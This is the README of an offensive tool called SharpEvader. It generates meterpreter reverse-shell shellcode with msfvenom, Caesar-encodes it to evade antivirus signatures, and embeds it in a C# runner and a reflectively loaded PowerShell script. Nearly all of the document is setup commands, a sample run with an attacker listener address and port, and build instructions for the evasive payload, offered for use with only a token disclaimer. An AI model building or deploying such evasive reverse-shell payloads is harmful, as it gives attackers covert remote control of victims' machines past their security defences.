# ü§î SharpEvader
#### This is a python script which automatically generates meterpreter `tcp`/`https` shellcode and caeser encodes it and slaps some Behavioural detection in a c# Project for you to build and run


# ‚ú® Features
- Automatically generate's `windows/x64/meterpreter/reverse_https` or `windows/x64/meterpreter/reverse_tcp` shellcode by borrowing `msfvenom`(What more do you expect, Write an `msfvenom` clone from scratch ??) from your linux host.
- Applies some magic sauce inorder to bypass the Signature Based detection.(The magic sauce is absolutely not Caeser Cipher).
- Generate's a C# Project with the encoded shellcode and some more spells to bypass Behavioural Based Detection.
- Quick, Order your Reverse Shell now Available at an easy installment of $999 each :)
- Powershell Script to generate a reflection ps1 script with the C# executable embedded inside it[Tested as of 1st July 2022].
- Does not use Java !!!
- Owner's or Contributor's of this repo does not take responsibiltes of any damages caused using it or with it, any illegal usage is highly discouraged.


# ‚öôÔ∏è Requirements
- Python3.7+
- msfvenom or Metasploit Framework
- mono-mcs C# compiler package
- Powershell on Linux[Optional]
```bash
sudo apt update && sudo apt install python3 metasploit-framework mono-mcs powershell
# Metasploit-framework & Powershell are defaultly available on Kali & hopefully parrot(If your distro doesn't have it then its your headache)
```

# ü§∏ Usage

## [Automatic Method]Run SharpEvader.py which would give you compiled exe and ps1 script inside the output folder
```bash
~/SharpEvader > python3 sharpevader.py

LHOST: 10.10.14.1
LPORT: 9001
PAYLOAD TYPE(tcp/https): tcp
[*] Using LHOST as 10.10.14.1, LPORT as 9001 and PAYLOAD as windows/x64/meterpreter/reverse_tcp
[*] Generating msfvenom shellcode...
[+] MSFVenom Shellcode generation successful
[+] Encoded shellcode with caeser cipher with +7 as Key
[*] Deleting the msf_shellcode.hex file as no one wants it anymore
[*] Baking the fresh Shellcode into a C# project for compiling
[+] Your C# shellcode runner is baked successfully, and it smells nice !!!
[+] C# Compiler found, Time for some frosting on the cake ^_^
[+] Your cake has been frosted successfully and named output/10.10.14.1_9001_tcp/rev.exe
[+] Powershell Found, Let\'s Box up your frosted cake...
[+] Boxed it up and named output/10.10.14.1_9001_tcp/rev.ps1
[+] Happy Evasion using 10.10.14.1_9001_tcp!!!

~/SharpEvader/output/10.10.14.1_9001_tcp >  ls -l
total 16
drwxr-xr-x 3 root root 4096 Aug  9 17:26 csharp
-rwxr-xr-x 1 root root 5120 Aug  9 17:26 rev.exe
-rw-r--r-- 1 root root 3308 Aug  9 17:26 rev.ps1
```

---

## [Manual Method]The C# project directory would be placed inside the output directory with name [[LHOST]_[LPORT]_[PAYLOADTYPE]]/csharp/
```bash
~/SharpEvader/output/10.10.14.1_9001_tcp/csharp > ls -l
total 24
-rwxr-xr-x 1 root root  189 Aug  9 17:26 App.config
-rwxr-xr-x 1 root root 4135 Aug  9 17:26 Program.cs
drwxr-xr-x 2 root root 4096 Aug  9 17:26 Properties
-rwxr-xr-x 1 root root 3189 Aug  9 17:26 rev.csproj
-rwxr-xr-x 1 root root  892 Aug  9 17:26 rev.sln
```

## To be done on Windows
- Transfer the rev_exe_[timestamp] from the output directory and launch `rev.sln` using `Visual Studio`.
- Build the Project using the `Release` and `x64` build configuration.
- Voila !!! The built C# executable would be available in the `rev_exe_[timestamp]/bin/x64/Release/rev.exe`

---

## [Optional] Can be done in Windows/Linux with powershell available
- Execute the `reflection_pwsh_gen.ps1` supplying the `-File` argument as the absolute path to the `rev.exe`
- This would generate a `rev.ps1` which would be consist the C# binary embedded into a ps1 script which would be reflectively loaded in the memory.

---

```bash
~/SharpEvader > pwsh reflection_pwsh_gen.ps1 -File ~/SharpEvader/output/rev_exe_01072022021313AM/bin/x64/Release/rev.exe
[+] Written the C# Embedded Reflection Reverse Shell into rev.ps1
```
